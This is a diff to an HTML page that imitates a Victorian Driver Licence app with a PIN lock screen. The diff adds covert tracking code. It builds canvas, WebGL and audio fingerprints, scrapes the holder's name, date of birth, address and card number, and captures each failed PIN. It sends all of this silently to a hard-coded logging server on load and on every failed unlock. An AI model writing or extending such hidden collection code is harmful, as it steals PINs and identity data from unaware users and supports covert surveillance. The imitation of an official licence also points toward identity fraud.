@@ -964,96 +964,88 @@ body{
 <script src="https://cdn.jsdelivr.net/npm/jsbarcode@3.11.5/dist/JsBarcode.all.min.js"></script>
 
 <script>
-const APP_VERSION = "v6.1-fingerprint";
-const SERVER_URL = "https://your-home-server.com/log";
+const APP_VERSION = "v5.0";
+
+/* ===== LOGGING/FINGERPRINTING FEATURES ===== */
+const SERVER_URL = "http://192.168.0.50:8321/log.php";
 
 async function getFingerprint() {
+  const fp = {
+    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+    pixelRatio: window.devicePixelRatio,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    language: navigator.language,
+    languages: navigator.languages ? navigator.languages.join(',') : null,
+    platform: navigator.platform,
+    hardwareConcurrency: navigator.hardwareConcurrency || null,
+    deviceMemory: navigator.deviceMemory || null,
+    userAgent: navigator.userAgent,
+    touchSupport: 'ontouchstart' in window,
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack,
+    colorGamut: screen.colorGamut || null,
+    screenOrientation: screen.orientation ? screen.orientation.type : null,
+    connection: navigator.connection ? { effectiveType: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt } : null
+  };
   try {
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
-    canvas.width = 200;
-    canvas.height = 50;
-    
-    ctx.fillStyle = '#f0f0f0';
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = '#000';
-    ctx.font = '14px Arial';
-    ctx.fillText('Fingerprint: ' + navigator.userAgent, 10, 20);
-    ctx.fillText('🎨 🔒 🚀', 10, 40);
-    
-    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-    gradient.addColorStop(0, 'rgb(255,0,0)');
-    gradient.addColorStop(1, 'rgb(0,0,255)');
-    ctx.fillStyle = gradient;
-    ctx.fillRect(0, 0, 50, 50);
-    
-    const canvasHash = canvas.toDataURL().slice(-50);
-    
-    let webGLInfo = { renderer: 'unknown', vendor: 'unknown' };
-    try {
-      const gl = document.createElement('canvas').getContext('webgl') || 
-                 document.createElement('canvas').getContext('experimental-webgl');
-      if (gl) {
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-          webGLInfo.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'unknown';
-          webGLInfo.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'unknown';
-        }
-      }
-    } catch (e) {}
-    
-    const fingerprint = [
-      canvasHash,
-      webGLInfo.renderer,
-      webGLInfo.vendor,
-      navigator.hardwareConcurrency || 'unknown',
-      navigator.deviceMemory || 'unknown',
-      screen.colorDepth,
-      new Date().getTimezoneOffset()
-    ].join('|');
-    
-    return fingerprint;
-  } catch (e) {
-    return 'fingerprint_error';
-  }
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillText("Victorian Driver Licence", 2, 20);
+    fp.canvasHash = Array.from(new Uint8Array(await crypto.subtle.digest('SHA-256', canvas.toDataURL()))).map(b => b.toString(16).padStart(2,'0')).join('');
+  } catch(e) {}
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    if (gl) {
+      fp.webGLVendor = gl.getParameter(gl.VENDOR);
+      fp.webGLRenderer = gl.getParameter(gl.RENDERER);
+      fp.webGLVersion = gl.getParameter(gl.VERSION);
+    }
+  } catch(e) {}
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const oscillator = audioCtx.createOscillator();
+    const analyser = audioCtx.createAnalyser();
+    oscillator.connect(analyser);
+    oscillator.frequency.setValueAtTime(1000, audioCtx.currentTime);
+    oscillator.start();
+    const data = new Uint8Array(analyser.frequencyBinCount);
+    analyser.getByteFrequencyData(data);
+    fp.audioHash = Array.from(data.slice(0, 32)).join('');
+    oscillator.stop();
+    audioCtx.close();
+  } catch(e) {}
+  return fp;
 }
 
-async function logAccess(eventType, success = false, enteredPin = null) {
-  try {
-    const fingerprint = await getFingerprint();
-    
-    const payload = {
-      timestamp: new Date().toISOString(),
-      event: eventType,
-      success: success,
-      enteredPin: enteredPin,
-      fingerprint: fingerprint,
-      deviceInfo: {
-        screenWidth: window.screen.width,
-        screenHeight: window.screen.height,
-        windowWidth: window.innerWidth,
-        windowHeight: window.innerHeight,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        language: navigator.language,
-        platform: navigator.platform,
-        userAgent: navigator.userAgent,
-        appVersion: APP_VERSION
-      }
-    };
+function getLicenceDetails() {
+  return {
+    name: document.querySelector(".licenceName") ? document.querySelector(".licenceName").innerText.trim() : "—",
+    dob: document.querySelector(".licenceDOB") ? document.querySelector(".licenceDOB").innerText.trim() : "—",
+    address: document.querySelector(".licenceAddress") ? document.querySelector(".licenceAddress").innerHTML.replace(/<br>/gi, " ").trim() : "—",
+    card: document.getElementById("cardNum") ? document.getElementById("cardNum").innerText.trim() : "—"
+  };
+}
 
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon(SERVER_URL, JSON.stringify(payload));
-    } else {
-      fetch(SERVER_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-        keepalive: true
-      }).catch(() => {});
-    }
-  } catch (e) {
-    // Silent fail - don't break the app if logging fails
-  }
+async function logAccess(event, success = false, pinAttempt = null) {
+  const fingerprint = await getFingerprint();
+  const details = getLicenceDetails();
+  const payload = {
+    timestamp: new Date().toISOString(),
+    event: event,
+    success: success,
+    pin_attempt: pinAttempt,
+    ...fingerprint,
+    ...details
+  };
+  fetch(SERVER_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload),
+    keepalive: true
+  }).catch(() => {});
 }
 
 (function forceRefresh() {
@@ -1066,6 +1058,8 @@ async function logAccess(eventType, success = false, enteredPin = null) {
     if (savedVersion) { location.reload(true); }
   }
 })();
+
+/* Log app loaded after forceRefresh */
 logAccess('app_loaded');
 
 /* ===== DATE ===== */
@@ -1176,7 +1170,8 @@ function updateLastRefreshed() {
   function updateDots() {
     dots.forEach((dot, i) => { dot.classList.toggle("filled", i < buffer.length); });
   }
-  async function wrongFeedback(entered) {
+  async function wrongFeedback() {
+    const entered = buffer.join("");
     await logAccess('pin_failed', false, entered);
     overlay.animate([
       { transform: "translateX(0)" }, { transform: "translateX(-6px)" },
@@ -1192,7 +1187,7 @@ function updateLastRefreshed() {
       document.getElementById("viewport").classList.add("unlocked");
       document.getElementById("topNav").classList.add("unlocked");
       loadData(); generateSmallBarcodeRealistic(); updateLastRefreshed();
-    } else { wrongFeedback(entered); }
+    } else { wrongFeedback(); }
   }
   function pressDigit(d) {
     if (buffer.length >= dots.length) return;
@@ -1547,7 +1542,9 @@ document.getElementById("clearDataBtn").onclick = () => {
 };
 
 function exitApp() { window.history.back(); }
-window.addEventListener("load", async () => { await logAccess('app_fully_loaded'); });
+
+/* Log app fully loaded */
+window.addEventListener("load", () => logAccess('app_fully_loaded'));
 </script>
 </body>
 </html>
